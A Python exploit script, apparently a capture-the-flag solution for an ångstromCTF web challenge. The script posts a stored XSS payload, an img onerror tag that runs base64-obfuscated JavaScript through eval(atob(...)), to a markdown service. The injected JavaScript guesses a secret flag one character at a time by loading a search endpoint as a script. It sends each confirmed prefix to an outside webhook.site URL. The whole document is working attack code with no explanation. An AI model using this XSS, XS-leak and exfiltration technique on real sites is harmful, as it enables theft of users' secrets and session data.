import requests
import base64

payload = """
const url = "https://wwwwwwwwaas.web.actf.co"; 
const webhook = "https://webhook.site/8cda91cf-9e4b-4ed8-8655-11770f30a4ec"; 

function log(query) { 
    navigator.sendBeacon(webhook + '/log?flag=' + query);
}

function search(query) {
    let script = document.createElement("script"); 
    script.src = url + '/search?q=' + encodeURIComponent(query); 
    script.onload = () => { 
        log(query); 
        check(query); 
    }; 
    document.head.appendChild(script);
}

const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}";
function check(flag) { 
    for(let i = 0 ; i < chars.length ; i++) { 
        let c = chars[i]; 
        search(flag + c); 
    }
}
check("actf{");
"""

payload = base64.b64encode(payload.encode()).decode() 

r = requests.post(
    "https://markdown.web.actf.co/create", 
    data={"content": f'<img src="x" onerror="eval(atob(`{payload}`))">'},
    allow_redirects=True
)

print(r.url)